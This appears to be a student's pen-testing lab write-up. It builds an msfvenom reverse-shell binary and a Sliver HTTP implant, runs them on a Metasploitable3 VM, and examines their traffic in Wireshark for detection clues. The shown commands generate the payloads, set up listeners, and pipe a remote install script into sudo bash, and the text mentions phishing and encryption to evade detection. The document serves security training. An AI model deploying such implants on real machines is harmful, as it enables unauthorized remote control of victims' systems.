# A) Venom
**Objective**
- Create malware using **Msfvenom** that spins up a **reverse shell**
- Accept the connection using Metasploits `multi/handler`


## What's msfvenom?
A payload generator and encoder
- Source: msfvenom man pages

## Target
`metasploitable3` is todays victim:
```bash
$ vagrant up ub1404
```
More on ms3 [here](<https://github.com/rapid7/metasploitable3>). And here's how I [set it up](<https://github.com/Ali-Mikael/Pen-testing/blob/main/h3-EternalExploit.md#setting-up>) using libvirt as the provider.


## ReverC 🐚
Fire up Kali and sraight to man pages we go:
```bash
$ man msfvenom
```

I got the basic idea but didn't know which output `format` to use, so we do:
```bash
$ msfvenom --list formats
```

Then craft the payload:
```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.130.233 LPORT=4040 -f elf -o legitBin

# Make the binary/payload executable:
$ chmod +x legitBin
```
Flags explained:
- `-p`: Payload to use `linux/x86/shell_reverse_tcp`
- `-f`: Output format `elf`
  - elf a.k.a Executable & Linkable Format is a binary format which can be executed on the system 
- `-o`: Output file `name_of_the_file`


> [!TIP]
> Use tab completion to your advantage. For example, after specifying the platform `linux/` (in this case), press tab a few times to get all the available options!


In `msfconsole` we use the `multi/handler` module to set up a listener:
```console
$ sudo msfconsole
msf > use exploit/multi/handler
    > options
    > set LHOST 192.168.130.233
    > set LPORT 4040
    > set payload linux/x86/shell_reverse_tcp    # <-- Match the payload
    > run
[*] Started reverse TCP handler on 192.168.130.233:4040 
```
Now that the listener is running we can execute the payload on the victims machine to get a reverse shell.


Get the ip of the victim:
```bash
$ sudo nmap -sn -T4 192.168.130.0/24

Nmap scan report for metasploitable3-ub1404 (192.168.130.202)
Host is up
```


**Drop the payload:**
```bash
$ rsync -av legitBin vagrant@192.168.130.202:/home/vagrant/
```
I'm using `rsync` to send it over via SSH, let's use our imagination here and say we sent the victim a link which it clicked and downloaded & executed the binary.

<img width="876" height="169" alt="2026-04-30-16:27:06" src="https://github.com/user-attachments/assets/a0d66341-2b3f-481e-ac20-f9e65f27a20c" />

The attacker now has a reverse shell:
<img width="1793" height="769" alt="2026-04-30-16:26:39" src="https://github.com/user-attachments/assets/e94a33e8-4162-482c-bbe6-40db9c8a2847" />




--------------




# B) Where's Venom
**Objective**
- Inspect and analyze the reverse shell connection using a packet sniffer such as Wireshark
  - What do you observe?
  - What makes the connection detectable?
  - How would one obscure the detection?
 

## Eavesdropping
I started packet capturing on the attackers interface `eth1` using Wireshark.

We can inspect the data being exchanged more closely by right clicking on one of the packets, then --> `Follow` and lastly --> `TCP Stream`.

`Red` is the attacker and `blue` is the response from the victim:

<img width="1394" height="846" alt="2026-04-30-16:56:30" src="https://github.com/user-attachments/assets/42c6299b-4d5b-49e3-9de1-25c858181a74" />

Talk about red team / blue team...

This makes it obvious that somebody is connected to the machine and executing shell commands. One could **obscure** it by encrypting the traffic for example!





------------





# C) Hello Sliver
**Objective**
- Show an example of an HTTP-connection using Sliver

## Sliver?
"A powerful command and control framework designed to provide advanced capabilities for covertly managing and controlling remote systems"
- [Source](<https://sliver.sh/>)


## Install on kali:
```bash
$ sudo apt update && sudo apt install sliver -y
# OR
$ curl https://sliver.sh/install | sudo bash
```

Type `sliver-server` for the interactive console:

<img width="1774" height="729" alt="2026-04-30-18:56:52" src="https://github.com/user-attachments/assets/9ea10b53-291b-474c-bc57-dfa3f4998e38" />


> [!TIP]
> Type `help` for a listing of all available commands !
>
> Some of the commands in Sliver are platform dependent, allthough you shouldn't even see the ones you cannot use if you downloaded the program from the correct channels.

## Modes
Sliver `implants` operate in `beacon` or `session` mode. Beacon mode basically means that the implant on the client will periodically retreive tasks from the server, execute, and return with the results, this is an asynchronous mode of communication.

In session mode the implant creates a real-time session either by a persistent connectin or long polling. Long polling basically means the client will check in with the server and only return after there's something to return with, compared to short polling where the client periodically sends probes to the target.

**Q:** You talked about implants, what are they?

**A:** An `implant` is the actual code that runs on the target system we want remote access to!

In order to establish a connection, we first need to **generate the implant**. We don't know how to do that yet, so in the console:
```console
sliver > generate --help
```
This gives us a pretty comprehensive look on all the options.

Having perused the help page we come up with the following:
```console
sliver > generate -b 192.168.130.233 -o linux

```
**Flags:**
- `-b` - http(s) connection string
- `-o` - Operating system

Wait a few seconds for it to compile and get:
```
[*] Build completed in 2m44s
[*] Implant saved to /home/steve/box/sliver/PAINFUL_WHORL
```
List all implants like so:

<img width="1904" height="345" alt="2026-04-30-19:36:09" src="https://github.com/user-attachments/assets/65c5efb1-8274-47fe-9f5b-41e60ae3ecca" />


Start a `HTTP` listener:
```console
sliver > http

[*] Starting HTTP :80 listener ...
[*] Successfully started job #2
```
Active session?

<img width="533" height="129" alt="2026-04-30-19:39:41" src="https://github.com/user-attachments/assets/e1ce07f8-5fbf-40c9-a21f-78c1b8332220" />

Not yet :/. Let's change that! If you paid attention you know it saved the **payload** to a directory I created earlier for sliver. 

We go to the directory and send the payload away:
```bash
$ rsync -av PAINFUL_WHORL vagrant@192.168.130.202:/home/vagrant
```
On the victim: (play along again that we did some magnificent phishing campaign and got the victim to download the malware! 😆)
<img width="881" height="120" alt="2026-04-30-19:44:01" src="https://github.com/user-attachments/assets/4b4df092-8eb5-4958-89ab-a1fa70b40692" />

If we type `sessions` again in the console we can see that the connection is activated:

<img width="1858" height="197" alt="2026-04-30-19:44:33" src="https://github.com/user-attachments/assets/dd1d514b-2f1e-485a-9e2f-8134147f3e90" />


To `use` the session we:

<img width="1364" height="233" alt="2026-04-30-19:46:39" src="https://github.com/user-attachments/assets/6f3b0f6c-3201-49d6-9805-ce0cf47a9da6" />

While connected you can always type `help` to get a list of all available commands in the session.

For example, list all interfaces on the host:
<img width="1714" height="886" alt="2026-04-30-19:49:03" src="https://github.com/user-attachments/assets/9947b35c-d717-4cab-8c0f-185e427e5089" />

And there you have it, a simple `HTTP` connection. Next we'll dissect it.

**Help received**
-  [Sliver documentation](<https://sliver.sh/docs>)




---------------




# D) Sniff sliver
**Objective**
- Inspect the Sliver http-connection using a packet sniffer
  - What do you observe?
  - What makes the connection detectable?

## Eavesdropping
Fire up wireshark and start listening.

The first suspect thing we notice is that the connection uses `HTTP` which is inherently insecure, plus it uses an old version of said protocol `HTTP/1.1`.

Let's take a look at an example:

<img width="1868" height="392" alt="2026-04-30-19:54:24" src="https://github.com/user-attachments/assets/d8ec6b86-a685-42ef-91af-23e6676a3594" />

The connection is insecure and the `URI` is looking a bit suspicious as well.

If we `follow tcp stream` again it looks even more questionable:

<img width="1373" height="685" alt="2026-04-30-20:05:58" src="https://github.com/user-attachments/assets/1fbdb81f-88e2-42eb-ae2d-b6dc321658a2" />

There's a bunch of `GET` requests and the server keeps responding with `204 No Content`, which is used to implement "save and continue editing" functionality in applications.

**Q:** What makes it suspect?

**A:** The fact that the 204 response is meant for `PUT` and `DELETE` requests, **NOT** `GET`. At least that's the understanding I got from the [Mozilla developer docs](<https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204>).





-------------




# E) Hiding in plain sight
**Objective**
- One can modify the connection details using Sliver
- Try and show an example
- Showcase that it works


# F) Multitalent
**Objective**
- Sliver is good for a lot
- Show examples of some of it's features



# I) Bonus: Veil
**Objective**
- Try out Veil


# J) Bonus: ScareCrow
**Objective**
- Try out ScareCrow

# K) Bonus: PoshC2
**Objective**
- Create malware that executes a reverse shell using PoshC2



# L) Bonus: Mythic
**Objective**
- Create malware that executes a reverse shell using Mythic
